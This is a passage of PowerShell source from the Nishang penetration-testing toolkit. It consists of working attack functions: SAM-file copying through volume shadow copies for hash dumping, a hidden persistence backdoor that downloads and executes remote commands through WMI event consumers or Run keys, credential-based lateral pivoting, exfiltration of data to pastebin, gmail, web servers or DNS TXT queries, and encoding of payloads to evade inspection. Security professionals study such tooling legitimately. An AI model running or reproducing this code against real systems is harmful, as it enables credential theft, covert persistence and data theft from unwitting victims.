        $SessionCommand = 'New-PSSession -ComputerName $server -Credential $Credentials'
    }

    else
    {
        $CheckCommand = 'gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True" -ComputerName $server'
        $SessionCommand = 'New-PSSession -ComputerName $server'
    }

    foreach ($server in $servers)
    {
       $check = Invoke-Expression $CheckCommand
       if($check -ne $null)
       {
           Write-Host "Credentials worked on $server !!" -ForegroundColor Green
           if ($CreateSessions -eq $True)
           {
                "`nCreating Session for $server"
                Invoke-Expression $SessionCommand
           }
        }
        else
        {
           "Could not connect or credentials didn't work on $server"
        }
    }
    
    if ($CreateSessions -eq $True)
    {
    Write-Host "`nFollowing Sessions have been created: " -ForegroundColor Green
    Get-PSSession
    }
}

##########################################Copy SAM file using Volume Shadow Service################################
<#
.SYNOPSIS
Nishang Payload which copies the SAM file.

.DESCRIPTION
This payload uses the VSS service (starts it if not running), creates a shadow of C: 
and copies  the SAM file which could be used to dump password hashes from it. This must be run from an elevated shell.

.PARAMETER PATH
The path where SAM file would be saved. The folder must exist already.

.EXAMPLE
PS > Copy-VSS
Saves the SAM file in current run location of the payload.

.Example
PS > Copy-VSS -path C:\temp

.LINK
http://www.canhazcode.com/index.php?a=4
https://github.com/samratashok/nishang

.NOTES
Code by @al14s

#>


function Copy-VSS
{
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Path
    )
    $service = (Get-Service -name VSS)
    if($service.Status -ne "Running")
    {
        $notrunning=1
        $service.Start()
    }
    $id = (gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
    $volume = (gwmi win32_shadowcopy -filter "ID='$id'")
    $filepath = "$pwd\SAM"
    if ($path)
    {
        $filepath = "$path\SAM"
    }

    `cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $filepath` 
    $volume.Delete()
    if($notrunning -eq 1)
    {
        $service.Stop()
    } 
}



########################################################Achieve persistence ###############################################
###http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx

function Persistence
{
<#
.SYNOPSIS
Function which could be used to add reboot persistence to powerpreter.

.DESCRIPTION
Powerpreter is dropped into the user's temp directory (with name Update.psm1) and either WMI permanent event consumer or Registry changes is used (based on privs) for persistence.
The Update.psm1 is then copied to $PSModulepath of the user.
Persistence created using this function could be cleaned by using the Remove-Persistence function.

.PARAMETER CheckURL
The URL which the payload would query for instructions.

.PARAMETER PayloadURL
The URL from where commands could be sent. Function names of Powerpreter could be used here.
If the target has powershell v2 (or you are not sure), use Import-Module Update in the command.
For example:   Import-Module Update; Get-Wlan-Keys


.PARAMETER PowerpreterURL
The URL from where powerpreter would be downloaded if it is removed from the user's temp directory.

.PARAMETER MagicString
The string which would act as an instruction to the payload to proceed with download and execute.

.PARAMETER StopString
The string which if found at CheckURL will stop the payload.

.PARAMETER persist
Use this parameter to achieve reboot persistence. Different methods of persistence with Admin access and normal user access.

.PARAMETER exfil
Use this parameter to use exfiltration methods for returning the results.

.PARAMETER ExfilOption
The method you want to use for exfitration of data. Valid options are "gmail","pastebin","WebServer" and "DNS".

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for other options

.PARAMETER username
Username for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER password
Password for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER URL
The URL of the webserver where POST requests would be sent.

.PARAMETER DomainName
The DomainName, whose subdomains would be used for sending TXT queries to.

.PARAMETER AuthNS
Authoritative Name Server for the domain specified in DomainName

.Example
PS > Persistence
The payload will ask for all required options.

.Example
PS > Persistence http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start stopthis -exfil -ExfilOption DNS -DomainName example.com -AuthNS 8.8.8.8
Use above command for using exfiltration methods.


.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
#>

    
[CmdletBinding(DefaultParameterSetName="noexfil")] Param(

        [Parameter(Parametersetname="exfil")]
        [Switch]
        $exfil,

        [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $CheckURL,

        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $PowerpreterURL,

        [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $MagicString,

        [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $StopString,
        
        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
        [String]
        $ExfilOption,

        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")] 
        [String]
        $dev_key = "null",

        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $username = "null",

        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $password = "null",

        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $URL = "null",
      
        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $DomainName = "null",

        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $AuthNS = "null"   
   
   )

    $backdoorcode = @' 
function Persistence_HTTP ($CheckURL, $PayloadURL, $MagicString, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil) 
{
    while($true)
    {
    $exec = 0
    start-sleep -seconds 5
    $webclient = New-Object System.Net.WebClient
    $filecontent = $webclient.DownloadString("$CheckURL")
    if($filecontent -eq $MagicString)
    {
        $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
        $exec++
        if ($exfil -eq $True)
        {
           Do-Exfiltration "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$AuthNS"
        }
        if ($exec -eq 1)
        {
            Start-Sleep -Seconds 60
        }
    }
    elseif ($filecontent -eq $StopString)
    {
        break
    }
    }
}
'@
    $powerpreterpath =  $MyInvocation.MyCommand.Module.Path
    Copy-Item $powerpreterpath -Destination $env:TEMP\Update.psm1
    echo "Set objShell = CreateObject(`"Wscript.shell`")" > "$env:temp\update.vbs"
    echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\update.ps1`")" >> "$env:temp\update.vbs"
    echo "if (!(Test-Path $env:TEMP\Update.psm1)) {(New-Object Net.WebClient).DownloadFile(`"$PowerpreterURL`",`"$env:temp\Update.psm1`")}" >> "$env:temp\update.ps1"
    echo "mkdir `"$home\Documents\WindowsPowerShell\Modules\Update(x64)`", `"$home\Documents\WindowsPowerShell\Modules\Update`", `"$home\Documents\WindowsPowerShell\Modules\UpdateCheck`"" > "$env:temp\update.ps1"
    echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\update.ps1"
    echo "Copy-Item `$currentpath -Destination `"$home\Documents\WindowsPowerShell\Modules\Update`"" >> "$env:temp\update.ps1"
    Out-File -InputObject $backdoorcode -Append "$env:TEMP\update.ps1"
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
    {
        $filterNS = "root\cimv2"
        $wmiNS = "root\subscription"
        $query = @"
         Select * from __InstanceCreationEvent within 3 
         where targetInstance isa 'Win32_LogonSession' 
"@
        $filterName = "WindowsSanity"
        $scriptpath = $env:TEMP
        $scriptFileName = "$scriptpath\update.vbs"
        $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
        $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
        $options = "Persistence_HTTP  $CheckURL $PayloadURL $MagicString $StopString"
        if ($exfil -eq $True)
        {
            $options = "Persistence_HTTP $CheckURL $PayloadURL $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
        }
        Out-File -InputObject $options -Append "$env:TEMP\update.ps1"
    }
    else
    {
        New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value "$($env:temp)\update.vbs" -force
        $options = "Persistence_HTTP  $CheckURL $PayloadURL $MagicString $StopString"
        if ($exfil -eq $True)
        {
            $options = "Persistence_HTTP $CheckURL $PayloadURL $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
        }
        Out-File -InputObject $options -Append "$env:TEMP\update.ps1"
    }
    
    Invoke-Expression "$env:TEMP\update.vbs"
}


########################################################## Clear Persistence ##############################################################
function Remove-Persistence
{
 <#
.SYNOPSIS
Function which could be used to clear the persistence added by backdoors and keylogger.

.DESCRIPTION
This function cleans WMI events and Registry keys added by various payloads and Add-persistence script of Nishang.
Run the function as an Administrator to remove the WMI events.

.Example
PS > Remove-Persistence

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
#>
   [CmdletBinding(DefaultParameterSetName="noexfil")] Param(
        [Parameter(Position = 0)] [Switch]
        $Remove
    )

    if ($Remove -eq $true)
    {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
        {    
            Write-Warning "Run the Command as an Administrator. Removing Registry keys only."
            Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -ErrorAction SilentlyContinue
            Break
        }

        Write-Output "Removing the WMI Events."
        $filterName = "WindowsSanity"
        gwmi __eventFilter -namespace root\subscription -filter "name='WindowsSanity'"| Remove-WmiObject
        gwmi activeScriptEventConsumer -Namespace root\subscription | Remove-WmiObject
        gwmi __filtertoconsumerbinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='WindowsSanity'"""  | Remove-WmiObject
        Write-Output "Removing the Registry keys."
        Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -ErrorAction SilentlyContinue
    }
    $Regkey = Get-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -name Update -ErrorAction SilentlyContinue
    $wmi_1 = gwmi __eventFilter -namespace root\subscription -filter "name='WindowsSanity'"
    $wmi_2 = gwmi activeScriptEventConsumer -Namespace root\subscription
    $wmi_3 = gwmi __filtertoconsumerbinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='WindowsSanity'"""
    if ($Regkey -ne $null )
    {
        Write-Warning "Run Registry key persistence found. Use with -Remove option to clean."
    }
    elseif (($wmi_1) -and ($wmi_2) -and ($wmi_3) -ne $null)    
    {
        Write-Warning "WMI permanent event consumer persistence found. Use with -Remove option to clean."
    }
    else
    {
        Write-Output "No Persistence found."
    }
}


#########################################################Pivoting to other systems##########################################################
function Pivot
{

<#
.SYNOPSIS
Function which provides pivoting to other machines in a network.

.DESCRIPTION
The functionality uses powershell remoting to connect to remote machines. Pivoting could be interactive or non-interactive.
Credentials are required to use this function. Username/pass or a shell with rights to access remote machines could be used as credentials.

.PARAMETER Computer
Name of the computer(s) to connect to. 

.PARAMETER User
Username to be used to connect to the target (optional).

.PARAMETER Pass
Password to be used to connect to the target (optional).

.PARAMETER cmd
Cmd to be executed on the target. Mandatory in case of non-interactive.

.PARAMETER Non_Interactive
If specified, the pivtoing is non-interactive. It is interactive by default.

.EXAMPLE
PS > Pivot -Computer <target>
Above command uses the credentials available with current powershell session (or other shell) to connect to target.
It creates PSSsessions. Use Use-Session to interact with the created sessions.

.EXAMPLE
PS > Pivot -Computer <Get-Content .\targets.txt> -User Administrator -Pass P@ssword123#  
Above command asks the user to provide username and passowrd and creates PSSessions. Use Use-Session to
interact with the created sessions.

PS > Pivot -Computer <target> -cmd Get-Process -Non_Interactive
Above command uses the credentials available with current powershell session (or other shell) to connect to target.
It provides a non-interactive pivot. Get-Process is executed on the target.

.EXAMPLE
PS > Pivot -Computer <target> -User Administrator -Pass P@ssword123# -cmd Get-Process 
Above command asks the user to provide username and passowrd and creates PSSessions.
Get-Process is executed on the target. Use Use-Session to interact with the created sessions.

.LINK
https://github.com/samratashok/nishang
#>



    [CmdletBinding()] Param ( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String[]]
        $Computer,

        [Parameter(Position = 1)]
        [String]
        $User,

        [Parameter(Position = 2)]
        [String]
        $Pass,

        [Parameter(Position = 3)]
        [String]
        $cmd,

        [Switch] $Non_Interactive
    )

    #Interactive pivoting
    if ($Non_Interactive -eq $false)
    {
        if ($User)
        {
            $Passwd = ConvertTo-SecureString $Pass -AsPlainText -Force
            $Creds = New-Object System.Management.Automation.PSCredential ($User, $Passwd)
            foreach ($comp in $Computer)
            {

                New-PSSession -ComputerName $comp -Credential $Creds
            }

        }
        else
        {
            New-PSSession -ComputerName $Computer

        }
    }
    #Non-Interactive pivoting (command execution on remote machines) using Invoke-Command
    if ($Non_Interactive -eq $true)
    {
    if ($User)
        {
            
            $Passwd = ConvertTo-SecureString $Pass -AsPlainText -Force
            $Creds = New-Object System.Management.Automation.PSCredential ($User, $Passwd)
            $sb = [scriptblock]::Create($cmd)
            foreach ($comp in $Computer)
            {
                $result = Invoke-Command -ComputerName $comp -Credential $Creds -ScriptBlock $sb
                "Output of command on $comp " + $result
            }
        }
        else
        {
            foreach ($comp in $Computer)
            {
                Invoke-Command -ComputerName $comp -ScriptBlock {$Command}
            }
            
        }
    }
    
}

function Use-Session
{
<#
.SYNOPSIS
Function which could be used to interact with sessions created using Pivot.

.DESCRIPTION
The functionality allows to interact with sessions created using the Pivot function. Use Get-PSSSession to
list the sessions created using Pivot.

.PARAMETER id
ID of the session to interact with. 

.EXAMPLE
PS > Use-Session -id <id>
Above command uses the credentials available with current powershell session (or other shell) to connect to target.
It creates PSSsessions. Use Use-Session to interact with the created sessions.

.LINK
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        $id
    )

    while($cmd -ne "exit")
    {
        $sess = Get-PSSession -Id $id
        $computername = $sess.ComputerName
        write-host -NoNewline "$computername> "
        $cmd = read-host
        $sb = [scriptblock]::Create($cmd)
        Invoke-Command -ScriptBlock $sb -Session $sess
    }
}


#####################################################Exfiltration Functionality################################################

function Do-Exfiltration
{
<#
.SYNOPSIS
Use this function to exfiltrate data from a target.

.DESCRIPTION
This function could be used to exfiltrate data from a target to gmail, pastebin, a webserver which could log POST requests
and a DNS Server which could log TXT queries. To decode the data exfiltrated by webserver and DNS methods use Invoke-Decode.

.PARAMETER Data
The data to be exfiltrated. Could be supplied by pipeline. 

.PARAMETER ExfilOption
The method you want to use for exfitration of data. Valid options are "gmail","pastebin","WebServer" and "DNS".

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for other options

.PARAMETER username
Username for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER password
Password for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER URL
The URL of the webserver where POST requests would be sent.

.PARAMETER DomainName
The DomainName, whose subdomains would be used for sending TXT queries to.

.PARAMETER AuthNS
Authoritative Name Server for the domain specified in DomainName


.EXAMPLE
PS > Get-Information | Do-Exfiltration -ExfilOption gmail -username <> -Password <>

Use above command for data exfiltration to gmail

.EXAMPLE
PS > Get-Information | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php

Use above command for data exfiltration to a webserver which logs POST requests.


.EXAMPLE
PS > Get-Information | Do-Exfiltration -ExfilOption DNS -DomainName example.com -AuthNS 192.168.254.228

Use above command for data exfiltration to a DNS server which logs TXT queries.


.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>

    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeLine = $True)] 
        [String]
        $Data,
        
        [Parameter(Position = 1, Mandatory = $True)] [ValidateSet("gmail","pastebin","WebServer","DNS")]
        [String]
        $ExfilOption,

        [Parameter(Position = 2, Mandatory = $False)] 
        [String]
        $dev_key,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $username,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $password,

        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $URL,
      
        [Parameter(Position = 6, Mandatory = $False)]
        [String]
        $DomainName,

        [Parameter(Position = 7, Mandatory = $False)]
        [String]
        $AuthNS
    )

    function post_http($url,$parameters) 
    { 
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length); 
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 
        $script:session_key=$http_request.responseText 
    } 

    function Compress-Encode
    {
        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $Data | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
        return $Compressed
    }

    if ($exfiloption -eq "pastebin")
    {
        $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $pastevalue = [System.Convert]::ToBase64String($utfbytes)
        $pastename = "Exfiltrated Data"
        post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
        post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
    }
        
    elseif ($exfiloption -eq "gmail")
    {
        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
        $smtpserver = “smtp.gmail.com”
        $msg = new-object Net.Mail.MailMessage
        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
        $smtp.EnableSsl = $True
        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password"); 
        $msg.From = "$username@gmail.com"
        $msg.To.Add("$username@gmail.com")
        $msg.Subject = "Exfiltrated Data"
        $msg.Body = $Data
        if ($filename)
        {
            $att = new-object Net.Mail.Attachment($filename)
            $msg.Attachments.Add($att)
        }
        $smtp.Send($msg)
    }

    elseif ($exfiloption -eq "webserver")
    {
        $Data = Compress-Encode    
        post_http $URL $Data
    }
    elseif ($ExfilOption -eq "DNS")
    {
        $code = Compress-Encode
        $queries = [int]($code.Length/63)
        while ($queries -ne 0)
        {
            $querystring = $code.Substring($lengthofsubstr,63)
            Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $AuthNS"
            $lengthofsubstr += 63
            $queries -= 1
        }
        $mod = $code.Length%63
        $query = $code.Substring($code.Length - $mod, $mod)
        Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"

    }

}

################################################Compress and Encode scripts and strings###############################
function Invoke-Encode
{
<#
.SYNOPSIS
Script for Nishang to encode and compress plain data.

.DESCRIPTION
The script asks for a path to a plain file, encodes it and writes to a file "encoded.txt" in the current working directory.

If the switch -OutCommand is used. An encoded command which could be executed on a non-powershell console is also generated.
The encoded command is useful in case of non-interactive shells like webshell or when special characters in scripts may
create problems, for example, a meterpreter session.

.PARAMETER DataToEncode
The path of the file to be decoded. Use with -IsString to enter a string.

.PARAMETER OutputFilePath
The path of the output file. Default is "encoded.txt" in the current working directory.

.PARAMETER OutputCommandFilePath
The path of the output file where encoded command would be written. Default is "encodedcommand.txt" in the current working directory.

.PARAMETER IsString
Use this to specify if you are passing a string ins place of a filepath.

.PARAMETER OutCommand
Generate an encoded command which could be used with -EncodedCommand parameter of PowerShell.

.PARAMETER PostScriptCommand
Generate a PowerShell command which is much smaller than encoded scripts. Useful in scenrios where
longer commands or scripts could not be used. 

.EXAMPLE

PS > Invoke-Encode -DataToEncode C:\scripts\data.txt

Use above command to generate encoded data which could be Decoded using the Invoke-Decode script.


PS > Invoke-Encode -DataToEncode C:\scripts\evil.ps1 -OutCommand

Use above command to generate encoded data and encoded command which could be used on a non-powershell console.
Use powershell -EncodedCommand <generated code here>


.EXAMPLE

PS > Invoke-Encode "A Secret message" -IsString

Use above to encode a string.


.EXAMPLE

PS > Invoke-Encode Get-Process -IsString -OutCommand

Use above to encode a command.


.LINK
http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
https://github.com/samratashok/nishang

#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DataToEncode,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $OutputFilePath = ".\encoded.txt", 

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $OutputCommandFilePath = ".\encodedcommand.txt",

        [Switch]
        $OutCommand,

        [Switch]
        $IsString,

        [Switch]
        $PostScriptCommand

    )
    if($IsString -eq $true)
    {
    
       $Enc = $DataToEncode
       
    }
    else
    {
        $Enc = Get-Content $DataToEncode -Encoding Ascii
    }


    #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
    $ms = New-Object IO.MemoryStream
    $action = [IO.Compression.CompressionMode]::Compress
    $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
    $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
    $Enc | ForEach-Object {$sw.WriteLine($_)}
    $sw.Close()
    
    # Base64 encode stream
    $Compressed = [Convert]::ToBase64String($ms.ToArray())
    Out-File -InputObject $Compressed -FilePath $OutputFilePath
    Write-Output "Encoded data written to $OutputFilePath"

    if (($OutCommand -eq $True) -or ($PostScriptCommand -eq $True))
    {
        #http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
        $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +

        "`$(New-Object IO.Compression.DeflateStream (" +

        "`$(New-Object IO.MemoryStream (,"+

        "`$([Convert]::FromBase64String('$Compressed')))), " +

        "[IO.Compression.CompressionMode]::Decompress)),"+

        " [Text.Encoding]::ASCII)).ReadToEnd();"
        
        #Generate Base64 encoded command to use with the powershell -encodedcommand paramter"
        $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
        $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
        #Check for max. length supported by Windows. If the base64 encoded command is longer use the other one.
        if (($EncScript.Length -gt 8190) -or ($PostScriptCommand -eq $True))
        {
            Out-File -InputObject $command -FilePath $OutputCommandFilePath
            Write-Output "Encoded command written to $OutputCommandFilePath"
        }
        else
        {
            Out-File -InputObject $EncScript -FilePath $OutputCommandFilePath
            Write-Output "Encoded command written to $OutputCommandFilePath"
        }
    }
}

################################################Decode scripts and strings encoded by Invoke-Encode###############################

function Invoke-Decode
{
<#
.SYNOPSIS
Script for Nishang to decode the data encoded by Invoke-Encode, DNS TXT and POST exfiltration methods.

.DESCRIPTION
The script asks for an encoded string as an option, decodes it and writes to a file "decoded.txt" in the current working directory.
Both the encoding and decoding is based on the code by ikarstein.

.PARAMETER EncodedData
The path of the file to be decoded. Use with -IsString to enter a string.


.PARAMETER OutputFilePath
The path of the output file. Default is "decoded.txt" in the current working directory.

.PARAMETER IsString
Use this to specify if you are passing a string ins place of a filepath.

.EXAMPLE

PS > Invoke-Decode -EncodedData C:\files\encoded.txt

.EXAMPLE

PS > Invoke-Decode c08t0Q0oyk9OLS7m5QIA -IsString

Use above to decode a string.

.LINK
http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
https://github.com/samratashok/nishang

#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $EncodedData,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $OutputFilePath = ".\decoded.txt", 

        [Switch]
        $IsString
    )
    
    if($IsString -eq $true)
    {
    
       $data = $EncodedData
       
    }
    else
    {
        $data = Get-Content $EncodedData -Encoding UTF8 
    }
    $dec = [System.Convert]::FromBase64String($data)
    $ms = New-Object System.IO.MemoryStream
    $ms.Write($dec, 0, $dec.Length)
    $ms.Seek(0,0) | Out-Null
    $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object System.IO.StreamReader($cs)
    $output = $sr.readtoend()
    Out-File -InputObject $output -FilePath $OutputFilePath
    Write-Host "Decode data written to $OutputFilePath"
}

############################################### Listener for Egress testing #############################################################
<#
.SYNOPSIS
FireListener is a functions that does egress testing. It is to be run on the attacking/listening machine.

.DESCRIPTION
FireListener hosts a listening server to which FireBuster can send packets to. Firebuster is to be run on the target machine which is to 
be tested for egress filtering.

.EXAMPLE
PS > FireListener -portrange 1000-1020

.LINK
http://www.labofapenetrationtester.com/2014/04/egress-testing-using-powershell.html
https://github.com/samratashok/nishang
http://roo7break.co.uk

.NOTES
Based on the script written by Nikhil ShreeKumar (@roo7break)
#>


function FireListener
{
    Param( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $PortRange
    )
    
    $ErrorActionPreference = 'SilentlyContinue'
    #Code which opens a socket for each port
    $socketblock = { 
		param($port = $args[1])
		try
		{
		
			$EndPoint = New-Object System.Net.IPEndPoint([ipaddress]::any, $port)
			$ListenSocket = New-Object System.Net.Sockets.TCPListener $EndPoint
			$ListenSocket.Start()		
			$RecData = $ListenSocket.AcceptTCPClient()
			$clientip = $RecData.Client.RemoteEndPoint.Address.ToString()
            $clientport = $RecData.Client.LocalEndPoint.Port.ToString()
			Write-Host "$clientip connected through port $clientport" -ForegroundColor Green
		    $Stream.Close()
			$ListenSocket.Stop()		
			} catch
			{ Write-Error $Error[0]	}
    }
		
	[int] $lowport = $portrange.split("-")[0]
	[int] $highport = $portrange.split("-")[1]	
	[int] $ports = 0	   
	Get-Job | Remove-Job

    #Start a job for each port
	for($ports=$lowport; $ports -le $highport; $ports++)
	{
		"Listening on port $ports"	
        $job = start-job -ScriptBlock $socketblock -ArgumentList $ports -Name $ports
	}


	[console]::TreatControlCAsInput = $true
	while ($true)
	{
		# code from http://poshcode.org/542 to capture Ctrl+C
		# start code snip
		if ($Host.UI.RawUI.KeyAvailable -and (3 -eq [int]$Host.UI.RawUI.ReadKey("AllowCtrlC,IncludeKeyUp,NoEcho").Character))
		{
			Write-Host "Stopping all jobs.....This can take many minutes." -Background DarkRed
			Sleep 2
            Get-Job | Stop-Job 
            Get-Job | Remove-Job
			#Stop-Process -Id $PID
			break;
		}
		# end code snip
		

        #Start a new job which listens on the same port for every completed job.
		foreach ($job1 in (Get-Job))
		{ 
            Start-Sleep -Seconds 4
			Get-Job | Receive-Job
			if ($job1.State -eq "Completed")
			{
				$port = $job1.Name
                "Listening on port $port"
                $newjobs = start-job -ScriptBlock $socketblock -ArgumentList $port -Name $port
                Get-Job | Remove-Job
			}
		}
	}
}

################################################## Connector for Egress Testing ##########################################################

function FireBuster{

<#
.SYNOPSIS
This script is part of Nishang. FireBuster is a PowerShell script that does egress testing. It is to be run on the target machine.

.DESCRIPTION
FireBuster sends packets to FireListener, which hosts a listening server. By default, FireBuster sends packets to all ports (which could be VERY slow).

.EXAMPLE
PS> FireBuster 10.10.10.10 1000-1020

.EXAMPLE
PS> FireBuster 10.10.10.10 1000-1020 -Verbose
Use above for increased verbosity.

.LINK
http://www.labofapenetrationtester.com/2014/04/egress-testing-using-powershell.html
https://github.com/samratashok/nishang
http://roo7break.co.uk

.NOTES
Major part of the script is written by Nikhil ShreeKumar (@roo7break)
#>
    
    [CmdletBinding()] Param( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $targetip = $(throw "Please specify an EndPoint (Host or IP Address)"),

        [Parameter(Position = 1, Mandatory = $False)]
        [String] $portrange = "1-65535"
    )
    
    $ErrorActionPreference = 'SilentlyContinue'    
    [int] $lowport = $portrange.split("-")[0]
    [int] $highport = $portrange.split("-")[1]
	
    $hostaddr = [system.net.IPAddress]::Parse($targetip)
    Write-Verbose "Trying to connect to $hostaddr from $lowport to $highport"
	[int] $ports = 0
	Write-Host "Sending...."
	for($ports=$lowport; $ports -le $highport ; $ports++){
        try{
            Write-Verbose "Trying port $ports"
            $client = New-Object System.Net.Sockets.TcpClient
            $beginConnect = $client.BeginConnect($hostaddr,$ports,$null,$null)
            $TimeOut = 300
            if($client.Connected)
            {
                Write-Host "Connected to port $ports" -ForegroundColor Green
            }
